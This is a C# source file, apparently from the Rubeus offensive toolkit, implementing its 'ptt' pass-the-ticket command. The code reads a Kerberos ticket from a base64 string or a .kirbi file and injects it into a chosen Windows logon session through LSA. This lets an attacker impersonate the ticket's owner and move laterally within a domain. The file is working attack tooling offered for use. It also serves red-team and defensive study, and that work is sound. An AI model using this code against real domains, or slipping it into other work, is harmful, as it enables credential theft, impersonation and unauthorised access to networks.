using System;
using System.Collections.Generic;
using System.IO;

namespace Rubeus.Commands
{
    public class Ptt : ICommand
    {
        public static string CommandName => "ptt";

        public void Execute(Dictionary<string, string> arguments)
        {
            Interop.LUID luid = new Interop.LUID();

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new Interop.LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    LSA.ImportTicket(kirbiBytes, luid);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    LSA.ImportTicket(kirbiBytes, luid);
                }
                else
                {
                    Console.WriteLine("\r\n[X]/ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                }
                return;
            }
            else
            {
                Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
                return;
            }
        }
    }
}